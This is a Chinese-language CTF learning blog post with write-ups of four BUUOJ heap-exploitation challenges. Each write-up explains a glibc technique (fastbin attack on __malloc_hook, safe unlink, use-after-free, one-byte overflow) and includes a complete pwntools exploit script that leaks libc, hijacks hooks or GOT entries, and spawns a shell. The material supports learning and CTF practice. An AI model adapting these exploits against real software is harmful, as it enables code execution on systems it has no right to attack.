---
title: "CTF-user-pwn 堆漏洞做题日志 0x00 版"
description: "在做题日志 0x00 版，存在部分谬误待修正，如有错误请指出。"
date: 2026-03-20T00:00:00+08:00
image: pwn_heap_q0.jpg
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    - 学习日志
---


### babyheap_0ctf_2017

[题目链接](https://buuoj.cn/challenges#babyheap_0ctf_2017)

这是我第一个堆漏洞题目，详细记录一下，这个做法好像叫 **Fastbin 攻击**。

**所有的内存地址都是不动的**，所谓“加入 Allocate 区”都是形象化表述。

发现这个题有个菜单，显然的堆漏洞题目，但是它的 fill 没有检查 chunk 大小，所以显然可以堆溢出。

首先泄露 libc 基址，因为可以堆溢出，所以我们可以通过 溢出 chunk_0 修改 chunk_1 的 size 值，使 chunk_1 和 chunk_2 **表面上合并**（Glibc 认为 chunk_1 是一个大小为 0xb0 的大块），这会使 chunk_1 被释放时带着 chunk_2 一起进 unsorted bins（双向链表，fd 指向 main_arena + 88）。

然而 free 函数是直接对着 chunk 的标号释放内存的，所以我们把 chunk_1 free 掉，这使 chunk_1 不可被打印，**但是 chunk_2 是可以打印**的**在 unsorted bins 的**数据。

这时我们通过 allocate 在巨大的 chunk_1 上切割掉原本的 chunk_1 大小（复活 chunk_1），其 fd 指针刚好重写到原本 chunk_2 的 user_data 部分，这就可以打印出 chunk_2 的 fd 指针。

（注意：chunk_1 + chunk_2 至少要等于 0x80 防止掉入 fastbins，要设 chunk_3 防止掉到 TOP chunk）

main_arena+88 到 __malloc_hook 的偏移固定为 -0x68，而 __malloc_hook 是一个调试函数（glibc 2.34 之前），在执行 malloc 时，会先检测 __malloc_hook 的值，如果 __malloc_hook 的值存在，则执行该地址。

那么我们要把 __malloc_hook 移动到 Allocate 区，这疑似是一个模板，因为 __malloc_hook 在 -0x23 偏移区域附近有 0x7f 可以看作 0x70 的 size，所以可以通过先把 __malloc_hook 塞进 fastbins，然后再把它作为一个伪 chunk malloc 出来。

如何把它放到 fastbins 呢？fastbins 是单向链表，其 fd 指针指向了上一个被释放的 chunk，所以我们可以把 fastbins 的另一个块的 fd 篡改。

（注意：fd 指针在 user_data 区，所以要先把要篡改的 chunk 丢进 fastbins，再堆溢出篡改）

具体来讲，就是申请 chunk_4 和 chunk_5，把 chunk_5 释放丢进 fastbins，然后再 chunk_4 堆溢出，修改 chunk_5 的 fd 指针为 __malloc_hook - 0x23。

接着把 chunk_5 复活，这样 fastbins 就会把 fake fd 指向的 __malloc_hook - 0x23 加入 fastbins。

那么再申请一个 chunk_6 大小为 0x60，这样就会把 __malloc_hook 加入 Allocate 区。

（注意：malloc 要求 fd 指针有要求两个块大小差不多，所以 chunk_5 也要是 0x60 的大小）

最后依旧是固定偏移，__malloc_hook - 0x13 的位置放着其地址，上面填上 one_gagdet，最后 malloc 触发即可。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 28455
io = remote(host,port)
libc = ELF("./libc-2.23.so")
# io = process("./babyheap_0ctf_2017")

def Allocate(size):
    io.recvuntil(b"Command: ")
    io.sendline(b"1")
    io.recvuntil(b"Size: ")
    io.sendline(str(size))

def Fill(index,content):
    io.recvuntil(b"Command: ")
    io.sendline(b'2')
    io.recvuntil(b"Index: ")
    io.sendline(str(index))
    io.recvuntil(b"Size: ")
    io.sendline(str(len(content)))
    io.recvuntil(b"Content: ")
    io.send(content)

def Free(index):
    io.recvuntil(b"Command: ")
    io.sendline(b'3')
    io.recvuntil(b"Index: ")
    io.sendline(str(index))

def Dump(index):
    io.recvuntil(b"Command: ")
    io.sendline(b'4')
    io.recvuntil(b"Index: ")
    io.sendline(str(index))

def main():
    Allocate(0x10)  # index 0
    Allocate(0x10)  # index 1
    Allocate(0x80)  # index 2
    Allocate(0x10)  # index 3 : Guarder of top chunk
    payload_1 = b'A'*0x10 + p64(0) + p64(0xB1)
    Fill(0,payload_1)   # chunk_1 += chunk_2
    Free(1)
    Allocate(0x10)    # Index 1: chunk_1 reborn
    Dump(2)
    io.recvuntil(b"Content: \n")
    leak_data = io.recvn(8)
    leak_addr = u64(leak_data)
    print("\n[+] Leak main_arena+88 address :",hex(leak_addr))
    malloc_hook_addr = leak_addr - 0x68
    print("\n[+] Leak malloc hook address :",hex(malloc_hook_addr))
    libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
    print("\n[+] Leak libc base address :",hex(libc_base))
    Allocate(0x10)  # index 4
    Allocate(0x60)  # index 5
    Free(5)
    payload_2 = b'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23)
    Fill(4,payload_2)   
    Allocate(0x60)      # index 5 : chunk_5 reborn
    Allocate(0x60)      # index 6 : __malloc_hook into Allocate chunk
    one_gadget_offset = 0x4526a
    one_gadget = libc_base + one_gadget_offset
    print("\n[+] Leak one_gadget address :",hex(one_gadget))
    payload_3 = b'A'*0x13 + p64(one_gadget)
    Fill(6,payload_3)
    Allocate(256)
    io.interactive()

if __name__ == "__main__":
    main()
```

### easyheap

[题目链接](https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap)

由于没做出来，所以面向结果写题解了，对不起。

Safe Unlink 攻击。

因为没有打印了，所以不太可能泄露 main_arena 了。

由于 chunk 被释放时会检查前一个 chunk 是否被释放（即 size&1），若前一个 chunk 被释放就可能触发合并。

合并有一个检查机制，即 unlink，**其作用是检查其链表完整性，同时把要被合并的 chunk_1 摘除**，其 C 伪代码如下：

```
/* * 宏定义：把 chunk P 从双向链表中摘除
 * P：我们要摘除的 Chunk 的首地址
 */
#define unlink(P, BK, FD) {                                            
    // 1. 拿到 P 的前向指针和后向指针
    FD = P->fd;                                                          
    BK = P->bk;                                                          
    
    // 2. Safe Unlink 检查
    // 检查 FD 的 bk 是不是指回 P，检查 BK 的 fd 是不是指回 P
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) {              
        malloc_printerr ("corrupted double-linked list");                
    }                                                                    
    
    // 3. 安检通过后，执行真正的“摘除”操作
    else {                                                               
        FD->bk = BK;   // 让下一个块的 bk 指向上一个块
        BK->fd = FD;   // 让上一个块的 fd 指向下一个块
    }                                                                    
}
```

假设存在三个 chunk：chunk_0 (使用中) -> chunk_1 (已释放) -> chunk_2 (使用中，即将被释放)。

现在，执行 `free(chunk_2)`，由于 chunk_1 已释放，所以触发 unlink 机制。

检查前一个的后一个是不是 P，后一个的前一个是不是 P（**注意这里 FD 和 BK 都指的是 unsortedbins 的其他 chunk，而不指物理相邻的 chunk_0 或 chunk_2**）

如果完成了检查，接着摘除 chunk_1，假设在 unsortedbins 的 FD 指向 chunk_X，BK 指向 chunk_Y，那么发现最后 chunk_X 和 chunk_Y 成功链接，chunk_1 被解放了。

随即 chunk_1 和 chunk_2 合并成为一个新的 chunk，进入 unsortedbins 写入新的 fd 和 bk。

所以我们可以利用这一点，构造一个假 chunk，实现写入数据。

这道题特点是没有开 PIE，而且存在一个全局变量 heaparray 存储了所有申请了的 chunk 的头指针。

假设申请 chunk_0 和 chunk_1，当存在堆溢出漏洞时，可以覆盖 chunk_1 的 prev_size（构造假 chunk 想去哪去哪）和 size（消除 P 位触发合并）。

在 chunk_0 中构造假 chunk，释放的 chunk 的构造如下：

```
INTERNAL_SIZE_T      mchunk_prev_size;
INTERNAL_SIZE_T      mchunk_size;
struct malloc_chunk* fd;
struct malloc_chunk* bk;
……
```

为了使检查通过，我们需要利用存储了 chunk_0 头指针的 heaparray[0]，因为 chunk 的构造，所以我们可以认为 fd = P + 0x10，bk = P + 0x18。

既然它要检查 FD 的 bk，那么就让 FD = P - 0x18，同理 BK = P - 0x10。（令 P 为 heaparray[0]）

检查通过后就会让 heaparray[0] 从存储一个堆的头指针到**存储 bss 段上的一个地址（heaparray - 0x18）**。

此时此刻，我们再用 edit 修改 chunk_0 就直接在 heaparray - 0x18 处开始修改了，因此我们需要再填 0x18 个字节，再往 heaparray[0] 填上 free 的 got 表。

此时此刻，我们再用 edit 修改 chunk_0 就直接修改 free 的 got 表了，所以我们直接填上 system。

接着 free 一个带 binsh 的 chunk 就结束了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26750
io = remote(host,port)
# io = process("./easyheap")
elf = ELF("./easyheap")
ptr = 0x6020E0

def create(size,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'1')
    io.recvuntil(b"Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil(b"Content of heap:")
    io.sendline(content)

def edit(index,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'2')
    io.recvuntil(b"Index :")
    io.sendline(str(index))
    io.recvuntil(b"Size of Heap : ")
    io.sendline(str(len(content)))
    io.recvuntil(b"Content of heap : ")
    io.sendline(content)

def delete(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'3')
    io.recvuntil(b"Index :")
    io.sendline(str(index))

def main():
    create(0x80,b"this_is_index_0")  # index 0
    create(0x80,b"this_is_index_1")  # index 1
    create(0x80,b"/bin/sh\x00")      # index 2
    fake_prev_size = p64(0)
    fake_size = p64(0x81)
    fake_fd = p64(ptr - 0x18)
    fake_bk = p64(ptr - 0x10)
    fake_chunk = fake_prev_size + fake_size + fake_fd + fake_bk
    padding = b'A'*0x60
    chunk_1_fake_prev_size = p64(0x80)
    chunk_1_fake_size = p64(0x90)
    payload_1 = fake_chunk + padding + chunk_1_fake_prev_size + chunk_1_fake_size
    edit(0,payload_1)
    delete(1)   # merge chunk_0 && chunk_1
    payload_2 = p64(0)*3 + p64(elf.got['free'])
    edit(0,payload_2)
    system_addr = elf.plt['system']
    edit(0,p64(system_addr))
    delete(2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### hitcontraining_uaf

[hitcontraining_uaf](https://buuoj.cn/challenges#hitcontraining_uaf)

唉初学者认为这道题比上两道题简单多了。

见字如面（？）uaf 即 use after free，简单来说就是 free 一个 chunk 之后其指针并没有置为 NULL。

这道题随便申请两个块，发现每申请一次就会申请一个大小 为 0x10 的管理 chunk 和符合你要求的 chunk，那个管理 chunk 放着一个神秘地址 0x080485fb 和被它管理的 chunk 的 user_data 起始地址。

那么不难发现当调用 print 的时候其实是去管理 chunk 里找的，我们把它换成后门地址。

具体怎么换呢，我们删掉两个管理 chunk，然后申请一个 0x08（加上 size 是 0x10）的 chunk，那么这个 chunk 的管理 chunk 就是把第二个管理 chunk 拿过来用，这个 chunk 的 user chunk 就是第一个 chunk。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 28011
io = remote(host,port)
# io = process("./hacknote")
elf = ELF("./hacknote")
magic = 0x8048945

def add_note(content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'1')
    io.recvuntil(b"Note size :")
    io.sendline(str(len(content)).encode())
    io.recvuntil(b"Content :")
    io.send(content)

def del_note(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'2')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def print_note(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'3')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def main():
    add_note(b'A'*0x80)  # index 0
    add_note(b'B'*0x80)  # index 1 for guard
    del_note(0)
    del_note(1)
    add_note(p32(magic) + b'C'*4)   # 管理 chunk
    print_note(0)
    io.interactive()

    
if __name__ == "__main__":
    main()
```

### hitcontraining_heapcreator

[题目链接](https://buuoj.cn/challenges#hitcontraining_heapcreator)

先随便申请两个块看看，发现依旧是 manage_chunk + user_chunk 模式，manage_chunk 按顺序放了 0，manage_chunk 的大小，user_chunk 的 user_data 部分大小，user_data 的起始地址。

IDA 在 delete() 函数中找到了 `*(&heaparray + n0xA) = 0;` 每次删除 chunk 都会把指针置为 0，宣布 uaf 死掉了。

在 edit_heap() 函数找到了限制栈溢出的代码：`read_input(*((_QWORD *)*(&heaparray + n0xA) + 1), *(_QWORD *)*(&heaparray + n0xA) + 1LL);`

第一个参数是地址，QWORD + 1 代表管理 chunk 的 user_data 按照 64 位 后移一位存放的数据，就是 user_chunk 的 user_data 的起始地址。

第二个参数是长度，这里最后 +1LL，代表可以输入 user_data 的长度 +1 的长度，也就是存在 1 字节的溢出空间，称为 One-byte-overflow 漏洞。

初步思路是申请 chunk_0,chunk_1,chunk_2，通过单字节溢出可以修改 chunk_1 的 manage_chunk 大小，让 manage_chunk_1 包裹 user_chunk_1 和 manage_chunk_2，这样 delete() 的时候会把他们一起放入 bins，然后 malloc() 一个一样大小的就可以修改manage_chunk_2，使 manage_chunk_2 存储的 user_chunk_2_user_data 起始地址改为 free_got，edit user_chunk_2，就可以修改 free_got 表的内容。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 29025
io = remote(host,port)
# io = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("./libc-2.23.so")
free_got = elf.got['free']
# heaparray = 0x6020A0

def create(size,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'1')
    io.recvuntil(b"Size of Heap : ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content of heap:")
    io.send(content)

def edit(index,content):
    io.recvuntil(b"Your choice :")
    io.sendline(b'2')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())
    io.recvuntil(b"Content of heap : ")
    io.send(content)

def show(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'3')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def delete(index):
    io.recvuntil(b"Your choice :")
    io.sendline(b'4')
    io.recvuntil(b"Index :")
    io.sendline(str(index).encode())

def main():
    create(0x78,b"AAAA")    # index 0
    create(0x20,b"BBBB")    # index 1 
    create(0x20,b'CCCC')    # index 2 for guard
    payload_0 = b'D'*0x78 + b'\x71' # manage_chunk_1 (0x20) + user_chunk_1 (0x30) + manage_chunk_2_header(0x18) = 0x68 向上取整 → 0x71
    edit(0,payload_0)
    # gdb.attach(io)
    delete(1)
    create(0x60,b'EEEEEEEE')
    payload_1 = b'F'*0x10 + b'G'*0x30 + p64(0) + p64(0x21) + p64(0x20) + p64(free_got)
    # manage_chunk_1_tail(0x10) + user_chunk_1 (0x30) + manage_chunk_2_header(0x20 → 0 + manage_chunk_size + user_data_size + user_data_addr)
    edit(1,payload_1)
    # gdb.attach(io)
    # edit(2)
    show(2)
    io.recvuntil(b"Content : ")
    leak_data = io.recvline().strip()
    leak_data = leak_data.ljust(8,b'\x00')
    free_addr = u64(leak_data)
    print("\n [+] Leak free address :",hex(free_addr))
    libc_base = free_addr - libc.sym['free']
    print("\n [+] Leak libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n [+] Leak system address :",hex(system))
    edit(2,p64(system))
    edit(0,b"/bin/sh\x00")
    delete(0)
    io.interactive()

if __name__ == "__main__":
    main()
```
